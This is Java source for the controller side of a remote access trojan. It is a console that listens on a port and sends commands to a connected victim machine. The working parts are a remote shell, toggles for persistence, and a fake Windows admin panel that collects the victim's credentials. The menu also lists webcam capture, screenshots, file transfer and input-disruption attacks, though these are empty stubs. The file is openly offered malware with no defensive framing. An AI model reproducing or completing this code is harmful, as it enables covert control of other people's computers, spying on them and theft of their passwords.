import java.net.*;
import java.io.*;
import cs1.*;
public class Server implements Runnable {
    ServerSocket ss;
    Socket s;
    BufferedReader din;
    DataOutputStream dout;
    PrintStream ps;
    OutputStream os;
    public static void main(String[] args) throws Exception {
        new Server();
    }
    public Server() {
        try {
            ss = new ServerSocket(32323);
            run();
        } catch (IOException e) {
            e.printStackTrace();
        }       
    }
    public void run() {
        try {
            s = ss.accept();
            ps = new PrintStream(s.getOutputStream());
            os = s.getOutputStream();
            din = new BufferedReader(new InputStreamReader(s.getInputStream()));
            System.out.println("connection from " + s.getInetAddress());
            String command;
            while(true) {
                System.out.print("<console> : ");
                command=Keyboard.readString();
                command=command.toLowerCase().trim();
                if (command.equals("help")) {
                    System.out.println("HELP MENU:");
                    System.out.println("\tpersist - initiate persistance on remote machine");
                    System.out.println("\tshell - enter a stateless shell environment");
                    System.out.println("\tupload - open prompt for uploading a file");
                    System.out.println("\tdownload - open prompt for downloading a remote file");
                    System.out.println("\tscreenshot - take a screenshot of the remote machine");
                    System.out.println("\twebcam - take an image using the victims camera");
                    System.out.println("\tmousebreak - prevent the victims mouse from moving");
                    System.out.println("\tkeybreak - create issues with the victims keyboard");
                    System.out.println("\tadminpanel - creates a fake windows admin panel");
                }
                if (command.equals("persist")) {
                    System.out.println("persistence module initiated");
                    System.out.println("\nEnter 1 to create persistence, enter 2 to remove persistence");
                    String choice = Keyboard.readString();
                    if (choice.equals("1")) {
                        ps.println("ps99");   
                    } else if (choice.equals("2")) {
                        ps.println("ps-99");
                    }
                }
                if (command.equals("shell")) {
                    System.out.println("shell environment initiated");
                    System.out.println("type -99 to exit environemt");
                    ps.println("sh99");
                    ps.println("echo %username%");
                    String uname = din.readLine();
                    din.readLine();
                    while(true) {
                        System.out.print(uname + ">");
                        String in = Keyboard.readString();
                        if (in.equals("-99")) {
                            break;
                        }
                        ps.println(in);
                        String line = din.readLine();
                        while(!line.equals("{}{}{}")) {
                            System.out.println(line);
                            line=din.readLine();
                        }
                    }
                    ps.println("sh-99");
                }
                if (command.equals("upload")) {
                    System.out.println("file upload initiated");
                    
                }
                if (command.equals("download")) {
                    System.out.println("file download initiated");
                    
                }
                if (command.equals("screenshot")) {
                    System.out.println("screenshot module initiated");
                    
                }
                if (command.equals("webcam")) {
                    System.out.println("webcam module initiated");
                    
                }
                if (command.equals("mousebreak")) {
                    System.out.println("mousebreak attack initiated");
                    
                }
                if (command.equals("keybreak")) {
                    System.out.println("keybreak attack initiated");
                    
                }
                if (command.equals("adminpanel")) {
                    System.out.println("starting remote admin panel");
                    ps.println("ap99");
                    System.out.println("how long would you like the panel to remain in seconds?");
                    int seconds = (int)Keyboard.readDouble();
                    ps.println(seconds);
                    din.readLine();
                    String line = "";
                    System.out.println("WINDOW INITIATED\nLISTENING FOR CREDENTIALS...\n\n");
                    while(!line.equals("{}{}{}")) {
                        line=din.readLine();
                        if (!line.equals("{}{}{}")) {
                            System.out.println("CREDENTIALS GRABBED - " + line);
                        }
                    }
                    System.out.println();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 }